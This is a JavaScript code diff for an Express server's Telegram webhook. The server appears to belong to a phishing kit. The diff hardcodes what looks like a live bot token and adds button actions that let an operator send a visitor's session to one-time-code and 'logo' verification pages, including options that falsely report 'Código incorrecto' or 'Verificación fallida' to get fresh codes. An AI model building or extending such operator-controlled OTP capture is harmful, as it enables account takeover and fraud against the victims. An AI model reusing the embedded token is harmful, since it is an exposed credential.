@@ -96,18 +96,42 @@ app.post('/telegram-callback', (req, res) => {
 });
 
 // ============================================================
-// ENDPOINT 3: WEBHOOK DE TELEGRAM (OPCIONAL)
+// ENDPOINT 3: WEBHOOK DE TELEGRAM
 // ============================================================
-app.post('/telegram-webhook', (req, res) => {
+const BOT_TOKEN = '8499803362:AAHxkqI11-YbYgHvjQZf3l7EkpTHanKOe14';
+
+app.post('/telegram-webhook', async (req, res) => {
   const update = req.body;
 
   if (update.callback_query) {
-    const { data, message } = update.callback_query;
-    const sessionIdMatch = message?.text?.match(/sessionId[:\s]+(\w+)/);
+    const { id, data, message } = update.callback_query;
+
+    // Responder al callback para quitar el loading del botón
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: id })
+    }).catch(() => {});
+
+    // Extraer sessionId del texto del mensaje
+    const sessionIdMatch = message?.text?.match(/sessionId[:\s]+(\S+)/);
     const sessionId = sessionIdMatch?.[1];
 
-    if (sessionId) {
-      console.log(`[Webhook] Callback: ${data} para ${sessionId}`);
+    console.log(`[Webhook] callback: ${data}, sessionId: ${sessionId}`);
+
+    if (sessionId && data) {
+      const actionMap = {
+        'action_otp':       { action: 'OTP',        target: 'otp-check.html',  error: null,                           errorType: null  },
+        'action_otp_error': { action: 'OTP_ERROR',   target: 'otp-check.html',  error: 'Código incorrecto',            errorType: 'otp' },
+        'action_logo':      { action: 'LOGO',        target: 'logo-check.html', error: null,                           errorType: null  },
+        'action_logo_error':{ action: 'LOGO_ERROR',  target: 'logo-check.html', error: 'Verificación fallida',         errorType: 'logo'},
+      };
+
+      const mapping = actionMap[data];
+      if (mapping) {
+        sessionData[sessionId] = { ...mapping, updatedAt: Date.now() };
+        console.log(`[Webhook] Sesión ${sessionId} → ${mapping.action}`);
+      }
     }
   }
 
